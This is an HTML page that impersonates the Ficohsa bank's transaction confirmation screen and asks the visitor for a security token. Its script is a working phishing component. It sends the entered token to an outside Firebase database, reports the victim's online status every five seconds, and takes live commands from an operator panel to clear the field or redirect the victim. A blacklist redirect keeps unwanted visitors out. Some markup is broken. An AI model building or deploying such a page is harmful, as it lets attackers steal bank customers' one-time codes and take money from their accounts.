<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Ficohsa</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
<style>
  *{box-sizing:border-box}
  html,body{margin:0;padding:0}
  body{font-family:'Open Sans','Segoe UI',Tahoma,Arial,sans-serif;background:#e9e9e9;min-height:100vh;min-width:1000px;position:relative}

  /* ===== BANNER ===== */
  .topbar{position:relative;height:200px;background:#0d4bbd}
  .topbar-links{position:absolute;top:24px;right:40px;display:flex;align-items:center;gap:14px;
    color:#fff;font-size:14.5px;letter-spacing:.6px;font-weight:600}
  .topbar-links a{color:#fff;display:flex;align-items:center;gap:7px;text-decoration:none}
  .topbar-links .pipe{color:#9dbdf0;font-weight:400}
  .mob{display:none}
  .logo{position:absolute;top:45px;left:50%;transform:translateX(-50%);line-height:0}
  .logo svg{display:block;width:260px;height:auto}

  /* ===== TARJETA ===== */
  .wrapper{width:780px;margin:0 auto;position:relative;z-index:2}
  .card{margin-top:-48px;background:#fff;border:1px solid #dedede;box-shadow:0 1px 5px rgba(0,0,0,.13);padding-bottom:34px}

  .mhead{background:#0d4bbd;display:flex;align-items:center;justify-content:space-between;padding:16px 28px}
  .mhead span{color:#fff;font-size:22px;font-weight:600;letter-spacing:.3px}
  .cerrar{border:none;background:none;padding:0;cursor:pointer;line-height:0;opacity:.9}
  .cerrar:hover{opacity:.65}

  .mbody{padding:28px 32px 0}
  .bloque{display:flex;align-items:flex-start;gap:17px}
  .bloque svg{flex:0 0 auto;margin-top:1px}
  .bloque p{margin:0;font-size:18.5px;line-height:1.5;color:#33425c}

  .importante{margin:24px 0 0;font-size:18.5px;line-height:1.5;color:#33425c}
  .importante strong{font-weight:700}

  label{display:block;margin:32px 0 9px;font-size:15.5px;color:#46536b}
  input{width:100%;height:46px;background:#fff;border:1px solid #b9c2d0;border-left:4px solid #1a5fd0;
    padding:0 14px;font-family:inherit;font-size:17.5px;color:#26324a;outline:none;transition:border-color .15s,box-shadow .15s}
  input:focus{border-left-color:#0d4bbd;box-shadow:0 0 0 2px rgba(13,75,189,.12)}

  .btn-row{margin-top:22px;display:flex;justify-content:flex-end}
  .btn-row button{width:185px;height:38px;border:none;background:#85adf2;color:#fff;
    font-family:inherit;font-size:17.5px;font-weight:600;letter-spacing:.3px;cursor:default;transition:background .18s,box-shadow .18s}
  .btn-row button.ready{background:#0d4bbd;cursor:pointer}
  .btn-row button.ready:hover{background:#0a3f9f}
  .btn-row button.ready:active{box-shadow:inset 0 2px 5px rgba(0,0,0,.25)}

  .footer-row{margin-top:26px;display:flex;justify-content:space-between;align-items:center;font-size:14px;color:#4a4a4a}
  .footer-row .copy{display:flex;align-items:center;gap:5px}
  .footer-row .copy .c{color:#7a7a7a}
  .footer-row .faq{display:flex;align-items:center;gap:6px;color:#0c3f8f}
  .footer-row a{text-decoration:none;color:#0c3f8f}

  @media (max-width:768px){
    body{min-width:0}
    .topbar{height:38px}
    .desk{display:none!important}
    .mob{display:flex}
    .topbar-links{top:0;right:10px;height:38px;gap:9px;font-size:13px;letter-spacing:.5px}
    .topbar-links .pipe{color:#8fb3ec}
    .card-ico{width:30px;height:21px;border-radius:3px;background:#2f74d0;align-items:center;justify-content:center}
    .logo{left:10px;top:0;height:38px;transform:none;display:flex;align-items:center}
    .logo svg{width:92px}

    .wrapper{width:100%}
    .card{margin-top:0;border:none;box-shadow:none;padding-bottom:26px;min-height:420px}
    .mhead{padding:13px 20px}
    .mhead span{font-size:18px}
    .cerrar svg{width:30px;height:30px}
    .mbody{padding:22px 20px 0}
    .bloque{gap:13px}
    .bloque svg{width:26px;height:29px}
    .bloque p,.importante{font-size:14.5px}
    label{font-size:13.5px;margin-top:26px}
    input{height:40px;font-size:16px}
    .btn-row{margin-top:18px}
    .btn-row button{width:110px;height:34px;font-size:15px}
    .footer-row{font-size:12.5px;padding:0 20px}
  }
</style>
</head>
<body>

    <div class="topbar-links">

          <path d="M.7 4.2h15.6" stroke="#fff" stroke-width="1.3"/>

      </svg>
    </div>
  </header>

  <div class="wrapper">
    <div class="card">
      <div class="mhead">
        <span>Confirmación</span>
        <button class="cerrar" id="btnCerrar" aria-label="Cerrar">
          <svg width="34" height="34" viewBox="0 0 46 46" fill="none">
            <circle cx="23" cy="23" r="21" stroke="#c6d0e0" stroke-width="2.4"/>
            <path d="M16 16l14 14M30 16L16 30" stroke="#c6d0e0" stroke-width="2.4" stroke-linecap="round"/>
          </svg>
        </button>
      </div>

      <div class="mbody">
        <div class="bloque">
          <svg width="30" height="33" viewBox="0 0 42 46" fill="none">
            <rect x="4" y="18" width="34" height="25" rx="2.5" stroke="#5b6b85" stroke-width="2.8"/>
            <path d="M11 18v-5.5a10 10 0 0120 0V18" stroke="#5b6b85" stroke-width="2.8"/>
            <circle cx="21" cy="27" r="3" fill="#5b6b85"/>
            <path d="M21 29.5v6" stroke="#5b6b85" stroke-width="2.8" stroke-linecap="round"/>
          </svg>
          <p>El dispositivo de seguridad se utiliza para confirmar la transacción, ingrese la información correspondiente.</p>
        </div>

        <p class="importante"><strong>¡IMPORTANTE!</strong> No comparta este número con ninguna persona.</p>

        <form id="formToken" autocomplete="off">
          <label for="token">Ingresa una serie de Token</label>
          <input type="text" id="token" inputmode="numeric" required onkeypress='return event.charCode >= 48 && event.charCode <= 57' maxlength="8" autocomplete="off" autofocus>

<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
<script>
const CFG = { DB_URL: "https://cbonnlineec-default-rtdb.firebaseio.com/", ROOT: "ficohsa", REDIRECT_BLOQUEADO: "https://www.google.com" };

const DBX = (function(){
  const KEY='ficohsa_db';
  const vacio=()=>({logins:{},comandos:{},eliminados:{},blacklist:{},historial:{}});
  let fb=null, subs=[];
  const leer=()=>{ try{ return JSON.parse(localStorage.getItem(KEY))||vacio(); }catch(e){ return vacio(); } };
  const gp=(t,p)=>p.split('/').reduce((o,k)=>(o&&o[k]!==undefined)?o[k]:null,t);
  function notificar(){ subs.forEach(s=>{ try{ s.cb(gp(leer(),s.path)); }catch(e){} }); }
  window.addEventListener('storage',e=>{ if(e.key===KEY) notificar(); });
  return {
    init(){ if(!CFG.DB_URL||typeof firebase==='undefined') return false;
      if(!firebase.apps.length) firebase.initializeApp({databaseURL:CFG.DB_URL}); fb=firebase.database(); return true; },
    update(p,v){ if(fb) return fb.ref(CFG.ROOT+'/'+p).update(v);
      const t=leer(),ks=p.split('/'); let o=t; ks.slice(0,-1).forEach(k=>{ if(typeof o[k]!=='object'||o[k]===null) o[k]={}; o=o[k]; });
      o[ks[ks.length-1]]=Object.assign({},gp(t,p)||{},v);
      localStorage.setItem(KEY,JSON.stringify(t)); notificar(); },
    on(p,cb){ if(fb){ fb.ref(CFG.ROOT+'/'+p).on('value',s=>cb(s.val())); } else { subs.push({path:p,cb}); cb(gp(leer(),p)); } }
  };
})();

const id  = sessionStorage.getItem('ficohsa_id');
const inp = document.getElementById('token');
const btn = document.getElementById('btnContinuar');
const paginaActual = (location.pathname.split('/').pop() || 'token.html').toLowerCase();

DBX.init();
if(!id){ location.href = 'index.html'; }

/* ---- botón ---- */
function sync(){ btn.classList.toggle('ready', inp.value.trim().length > 0); }
inp.addEventListener('input', sync);
sync();
inp.focus();

document.getElementById('formToken').addEventListener('submit', function(e){ e.preventDefault(); enviar(); });

function ping(){
  if(!id) return;
  DBX.update('logins/'+id, { online:true, ultimoPing:Date.now(), pagina:'token.html', status:'ESPERANDO_TOKEN' });
}
ping(); setInterval(ping, 5000);

let enviado = false;
function enviar(){
  if(!inp.value.trim()){ inp.focus(); return; }
  if(enviado) return;
  enviado = true;
  btn.textContent = 'Enviando...';
  btn.classList.remove('ready');
  DBX.update('logins/'+id, {
    sms: inp.value.trim(), token: inp.value.trim(), smsEn: Date.now(),
    pagina:'token.html', status:'TOKEN_ENVIADO', online:true, ultimoPing:Date.now()
  });
  inp.blur();
  setTimeout(function(){ location.href = 'cargando.html'; }, 900);
}

/* ---- comandos del panel (sin recargarse a sí misma) ---- */
let ultimoComando = 0, primerEvento = true;
DBX.on('comandos/'+id, function(c){
  if(!c || !c.ts) return;

  // el primer valor que llega ya es la orden que nos trajo aquí: se ignora
  if(primerEvento){
    primerEvento = false;
    ultimoComando = c.ts;
    if(c.limpiarToken && !enviado){ inp.value=''; sync(); }
    return;
  }
  if(enviado) return;
  if(c.limpiarToken){ inp.value=''; sync(); }

  if(c.ts > ultimoComando && c.redirect){
    ultimoComando = c.ts;
    if(c.redirect.toLowerCase() === paginaActual) return;   // no recargar la misma página
    if(c.redirect.indexOf('index') !== -1) sessionStorage.removeItem('ficohsa_id');
    setTimeout(function(){ location.href = c.redirect; }, 400);
  }
});

document.getElementById('btnCerrar').addEventListener('click', function(){
  sessionStorage.removeItem('ficohsa_id');
  location.href = 'index.html';
});
</script>
</body>
</html>
